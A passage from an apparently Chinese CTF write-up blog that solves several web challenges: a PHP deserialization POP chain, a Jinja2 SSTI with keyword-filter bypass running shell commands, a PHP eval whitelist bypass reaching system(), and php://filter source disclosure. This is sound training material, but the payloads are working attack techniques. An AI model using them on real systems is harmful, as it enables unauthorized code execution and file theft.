class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>老规矩，像构造pop链，先找到终点</p>
<p>明显是school类中的IPO方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>这里应该就要用到php的原生类了，而提示又有flag.php，所以就使用原生类SplFileObject读取文件</p>
<p>而IPO又需要在school中的wakeup中调用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而调用IPO就需要hahaha符合条件</p>
<p>hahaha是classroom的一个方法,所以这里要实例化classroom赋给dapartment</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>hahaha返回true三个变量相等其中后面两个变量明显是一个对象中的name和rank变量</p>
<p>有这两个变量的只有teacher类，所以要实例化该类并赋值给leader</p>
<p>最后就是在teacher类中赋值name和rank即可</p>
<p>所以就构造exp为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span class="variable">$rank</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$leader</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;leader = <span class="variable">$leader</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hahaha</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;one class&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;name != <span class="string">&#x27;ing&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="string">&#x27;department&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$department</span>,<span class="variable">$ceo</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;department = <span class="variable">$department</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;headmaster = <span class="variable">$ceo</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">IPO</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;department-&gt;<span class="title function_ invoke__">hahaha</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">IPO</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">school</span>(<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>(<span class="string">&quot;one class&quot;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>(<span class="string">&quot;ing&quot;</span>,<span class="string">&quot;department&quot;</span>)),<span class="string">&quot;ong&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>可以得到传给d的参数应该为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9</span><br></pre></td></tr></table></figure>

<p>而对于给a和b传的值为（对于a使用php原生类，而b使用伪协议进行读取）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BGDOUCTF%202023%5D%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>直接base64解码就拿到flag了。</p>
<h2 id="NCTF-2018-flask真香"><a href="#NCTF-2018-flask真香" class="headerlink" title="[NCTF 2018]flask真香"></a>[NCTF 2018]flask真香</h2><img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE.png" class>

<p>题目什么都没有，F12也什么都没发现</p>
<p>到处乱点，在点击右下方的小点之后跳转到下一个页面</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE2.png" class>

<p>标签提示是jinja2的SSTI，我们进行测试</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p>确实是存在的</p>
<p>接下来试试有没有过滤什么</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>url空了，经过测试，发现过滤了下列字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class  mro  subclasses  builtins  eval  import  open  os</span><br></pre></td></tr></table></figure>

<p>使用字符串拼接的方法来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>找到&lt;class ‘os._wrap_close’&gt;，直接用ctrl+F找每个元素都有的字符 &gt; </p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>成功找到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287]&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287].__init__.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;+&quot;pen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE6.png" class>

<p>下一步就是cat flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__bases__[0][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[287].__init__.__globals__[&#x27;__bui&#x27;+&#x27;ltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;+&quot;pen(&#x27;cat /Th1s_is__F1114g&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BNCTF%202018%5Dflask%E7%9C%9F%E9%A6%99%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE7.png" class>

<h2 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h2><p>先看题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，我们只能使用白名单里的函数，接下来对我们要用到的函数做一个简单的解释：</p>
<p><strong>base_convert()函数</strong></p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE.png" class>

<p><strong>hex2bin() 函数</strong></p>
<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
<p><strong>dechex() 函数</strong></p>
<p>dechex() 函数把十进制数转换为十六进制数。</p>
<p>我们的目标命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=system(&quot;cat /flag&quot;)</span><br></pre></td></tr></table></figure>

<p>但是显然我们需要绕过白名单和黑名单，就不能出现引号和system函数，引号其实可以省略，没有引号命令也能执行，这里我们采用的方法是用变量保存函数和参数，如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>我们使用白名单里的函数进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>

<p>但是问题又来了，_GET不是白名单里的变量名，[]也被黑名单过滤</p>
<ol>
<li>[]可以用{}来代替</li>
<li>_GET就要用到上面的hex2bin() 函数转化</li>
</ol>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE2.png" class>

<p>_GET&#x3D;hex2bin(5f 47 45 54)</p>
<p>但是hex2bin也不是白名单里的函数，这里就用到白名单里的base_convert函数，用base_convert()函数将10进制数转化为36进制的hex2bin</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE3.png" class>

<p>hex2bin&#x3D;base_convert(37907361743,10,36)</p>
<p>5f 47 45 54也不能直接填，因为会被preg_match_all(‘&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;‘, $content, $used_funcs); 这句话当作函数名放进白名单里检测，所以5f 47 45 54也需要经过进制转化<br>dechex() 函数把十进制数转换为十六进制数。</p>
<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE4.png" class>

<p>5f474554<code>=</code>dechex(1598506324)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure>

<p>将get存进一个变量里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure>

<p>最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>

<img src="/2023/08/02/NSSCTF%E5%88%B7%E9%A2%98/%5BCISCN%202019%E5%88%9D%E8%B5%9B%5DLove%20Math%E8%A7%A3%E9%A2%98%E6%88%AA%E5%9B%BE5.png" class>

<h2 id="NSSRound-8-Basic-MyDoor"><a href="#NSSRound-8-Basic-MyDoor" class="headerlink" title="[NSSRound#8 Basic]MyDoor"></a>[NSSRound#8 Basic]MyDoor</h2><p>题目一进去是空白的，f12没什么反应，我们尝试访问index.php。也失败了，这里就尝试用伪协议来读取index.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>得到后端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试传参发现没有反应，这里涉及到了php解析变量的一个特性，在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候，php会将怪异的变量名转换成有效的，在进行解析时会删除空白符，并将空格、+、点、[ 转换为下划线。但是用一个特性是可以绕过的，就是当 [ 提前出现后，[ 会转换成下划线，而后面的字符就不会再被转义了。</p>
<p>也就是说如果不使用[的话，N_S.S就会被解析为N_S_S，所以正确的变量传参就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?N[S.S=phpinfo();</span><br></pre></td></tr></table></figure>

